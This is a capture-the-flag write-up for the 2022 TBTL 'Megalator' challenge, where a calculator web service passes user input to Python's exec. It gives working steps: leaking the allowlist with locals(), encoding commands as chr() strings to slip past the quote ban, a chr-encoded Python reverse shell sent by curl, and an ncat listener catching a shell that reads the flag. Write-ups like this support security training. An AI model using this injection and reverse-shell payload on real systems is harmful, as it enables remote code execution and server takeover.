# 2022 TBTL - Megalator

Megalator is a web page that offers calculator like service where one inputs the mathematical expression and the expression is **evaluated** with a result returned in the HTTP response:
```sh
$ curl "https://tbtl-megalator.chals.io/calc?expression=5*2" -i
HTTP/1.1 200 OK
Server: Werkzeug/2.1.1 Python/3.8.13
Date: Thu, 12 May 2022 13:50:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2

10
```

The largest tell in this challenge is if we pass only the mathematical operation (+, -, ...):
```sh
$ curl "https://tbtl-megalator.chals.io/calc?expression=+" -i
HTTP/1.1 200 OK
Server: Werkzeug/2.1.1 Python/3.8.13
Date: Thu, 12 May 2022 13:51:39 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 47

unexpected EOF while parsing (<string>, line 0)
```

This `unexpected EOF` message usually means that the input is evaluated and our code ended "too soon". The `Python` header suggests a Flask app, so we can easily continue with some Flask specific tests (or built-in functions). Keep in mind that `eval` is blocked, but there is `exec` function that can be used when `eval` is not available:
```sh
$ curl "https://tbtl-megalator.chals.io/calc?expression=eval(print(app))" -i
HTTP/1.1 200 OK
Server: Werkzeug/2.1.1 Python/3.8.13
Date: Thu, 12 May 2022 13:55:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 10

Barricade!
```

We can also leak the character allowlist to make our job easier:
```sh
$ curl "https://tbtl-megalator.chals.io/calc?expression=locals()" -i
HTTP/1.1 200 OK
Server: Werkzeug/2.1.1 Python/3.8.13
Date: Thu, 12 May 2022 13:55:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 124

{'expression': 'locals()', 'white_list': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789()+-*/% ', 'c': ')'}
```

Since we cannot use strings (quotations are not allowed), the most straightforward approach is to use `chr` calls to construct a string inside the `exec` function:
```
>>> cmd = "import os; os.system('id')"
>>> 
>>> for i in cmd:
...     print("chr({})+".format(ord(i)), end='')
... 
chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(59)+chr(32)+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(105)+chr(100)+chr(39)+chr(41)+
>>> exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(59)+chr(32)+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(105)+chr(100)+chr(39)+chr(41))
uid=1000(vm) gid=1000(vm) groups=1000(vm),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare)
```

In order to get the flag for this challenge, the following steps were made:
- converted the python TCP reverse shell into `chr(...)+chr(...)+...` format (localhost used here for demo purposes)
```
>>> cmd = 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
>>> for i in cmd:
...     print("chr({})+".format(ord(i)), end='')
... 
chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(115)+chr(111)+chr(99)+chr(107)+chr(101)+chr(116)+chr(44)+chr(111)+chr(115)+chr(44)+chr(112)+chr(116)+chr(121)+chr(59)+chr(115)+chr(61)+chr(115)+chr(111)+chr(99)+chr(107)+chr(101)+chr(116)+chr(46)+chr(115)+chr(111)+chr(99)+chr(107)+chr(101)+chr(116)+chr(40)+chr(115)+chr(111)+chr(99)+chr(107)+chr(101)+chr(116)+chr(46)+chr(65)+chr(70)+chr(95)+chr(73)+chr(78)+chr(69)+chr(84)+chr(44)+chr(115)+chr(111)+chr(99)+chr(107)+chr(101)+chr(116)+chr(46)+chr(83)+chr(79)+chr(67)+chr(75)+chr(95)+chr(83)+chr(84)+chr(82)+chr(69)+chr(65)+chr(77)+chr(41)+chr(59)+chr(115)+chr(46)+chr(99)+chr(111)+chr(110)+chr(110)+chr(101)+chr(99)+chr(116)+chr(40)+chr(40)+chr(34)+chr(49)+chr(50)+chr(55)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(49)+chr(34)+chr(44)+chr(56)+chr(48)+chr(48)+chr(48)+chr(41)+chr(41)+chr(59)+chr(111)+chr(115)+chr(46)+chr(100)+chr(117)+chr(112)+chr(50)+chr(40)+chr(115)+chr(46)+chr(102)+chr(105)+chr(108)+chr(101)+chr(110)+chr(111)+chr(40)+chr(41)+chr(44)+chr(48)+chr(41)+chr(59)+chr(111)+chr(115)+chr(46)+chr(100)+chr(117)+chr(112)+chr(50)+chr(40)+chr(115)+chr(46)+chr(102)+chr(105)+chr(108)+chr(101)+chr(110)+chr(111)+chr(40)+chr(41)+chr(44)+chr(49)+chr(41)+chr(59)+chr(111)+chr(115)+chr(46)+chr(100)+chr(117)+chr(112)+chr(50)+chr(40)+chr(115)+chr(46)+chr(102)+chr(105)+chr(108)+chr(101)+chr(110)+chr(111)+chr(40)+chr(41)+chr(44)+chr(50)+chr(41)+chr(59)+chr(112)+chr(116)+chr(121)+chr(46)+chr(115)+chr(112)+chr(97)+chr(119)+chr(110)+chr(40)+chr(34)+chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(115)+chr(104)+chr(34)+chr(41)+>>>
```
- executed the result as `exec(chr(...)+chr(...)+...)` in the `expression` parameter (localhost used here for demo purposes)
```
$ curl -i "https://tbtl-megalator.chals.io/calc?expression=exec%28chr%28105%29%2Bchr%28109%29%2Bchr%28112%29%2Bchr%28111%29%2Bchr%28114%29%2Bchr%28116%29%2Bchr%2832%29%2Bchr%28115%29%2Bchr%28111%29%2Bchr%2899%29%2Bchr%28107%29%2Bchr%28101%29%2Bchr%28116%29%2Bchr%2844%29%2Bchr%28111%29%2Bchr%28115%29%2Bchr%2844%29%2Bchr%28112%29%2Bchr%28116%29%2Bchr%28121%29%2Bchr%2859%29%2Bchr%28115%29%2Bchr%2861%29%2Bchr%28115%29%2Bchr%28111%29%2Bchr%2899%29%2Bchr%28107%29%2Bchr%28101%29%2Bchr%28116%29%2Bchr%2846%29%2Bchr%28115%29%2Bchr%28111%29%2Bchr%2899%29%2Bchr%28107%29%2Bchr%28101%29%2Bchr%28116%29%2Bchr%2840%29%2Bchr%28115%29%2Bchr%28111%29%2Bchr%2899%29%2Bchr%28107%29%2Bchr%28101%29%2Bchr%28116%29%2Bchr%2846%29%2Bchr%2865%29%2Bchr%2870%29%2Bchr%2895%29%2Bchr%2873%29%2Bchr%2878%29%2Bchr%2869%29%2Bchr%2884%29%2Bchr%2844%29%2Bchr%28115%29%2Bchr%28111%29%2Bchr%2899%29%2Bchr%28107%29%2Bchr%28101%29%2Bchr%28116%29%2Bchr%2846%29%2Bchr%2883%29%2Bchr%2879%29%2Bchr%2867%29%2Bchr%2875%29%2Bchr%2895%29%2Bchr%2883%29%2Bchr%2884%29%2Bchr%2882%29%2Bchr%2869%29%2Bchr%2865%29%2Bchr%2877%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%28115%29%2Bchr%2846%29%2Bchr%2899%29%2Bchr%28111%29%2Bchr%28110%29%2Bchr%28110%29%2Bchr%28101%29%2Bchr%2899%29%2Bchr%28116%29%2Bchr%2840%29%2Bchr%2840%29%2Bchr%2834%29%2Bchr%2849%29%2Bchr%2850%29%2Bchr%2855%29%2Bchr%2846%29%2Bchr%2848%29%2Bchr%2846%29%2Bchr%2848%29%2Bchr%2846%29%2Bchr%2849%29%2Bchr%2834%29%2Bchr%2844%29%2Bchr%2856%29%2Bchr%2848%29%2Bchr%2848%29%2Bchr%2848%29%2Bchr%2841%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%28111%29%2Bchr%28115%29%2Bchr%2846%29%2Bchr%28100%29%2Bchr%28117%29%2Bchr%28112%29%2Bchr%2850%29%2Bchr%2840%29%2Bchr%28115%29%2Bchr%2846%29%2Bchr%28102%29%2Bchr%28105%29%2Bchr%28108%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%28111%29%2Bchr%2840%29%2Bchr%2841%29%2Bchr%2844%29%2Bchr%2848%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%28111%29%2Bchr%28115%29%2Bchr%2846%29%2Bchr%28100%29%2Bchr%28117%29%2Bchr%28112%29%2Bchr%2850%29%2Bchr%2840%29%2Bchr%28115%29%2Bchr%2846%29%2Bchr%28102%29%2Bchr%28105%29%2Bchr%28108%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%28111%29%2Bchr%2840%29%2Bchr%2841%29%2Bchr%2844%29%2Bchr%2849%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%28111%29%2Bchr%28115%29%2Bchr%2846%29%2Bchr%28100%29%2Bchr%28117%29%2Bchr%28112%29%2Bchr%2850%29%2Bchr%2840%29%2Bchr%28115%29%2Bchr%2846%29%2Bchr%28102%29%2Bchr%28105%29%2Bchr%28108%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%28111%29%2Bchr%2840%29%2Bchr%2841%29%2Bchr%2844%29%2Bchr%2850%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%28112%29%2Bchr%28116%29%2Bchr%28121%29%2Bchr%2846%29%2Bchr%28115%29%2Bchr%28112%29%2Bchr%2897%29%2Bchr%28119%29%2Bchr%28110%29%2Bchr%2840%29%2Bchr%2834%29%2Bchr%2847%29%2Bchr%2898%29%2Bchr%28105%29%2Bchr%28110%29%2Bchr%2847%29%2Bchr%28115%29%2Bchr%28104%29%2Bchr%2834%29%2Bchr%2841%29%29"
HTTP/1.1 200 OK
Server: Werkzeug/2.1.1 Python/3.8.13
Date: Fri, 13 May 2022 07:38:29 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 30

[Errno 111] Connection refused
```
- obtained the reverse shell on the server and `cat flag.txt` on the obtained shell (actual server)
```
$ ncat -nlvp 8000
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 167.99.113.107.
Ncat: Connection from 167.99.113.107:52042.
$ cat flag.txt
cat flag.txt
TBTL{50met1me5_5trong_15_we4k}
```
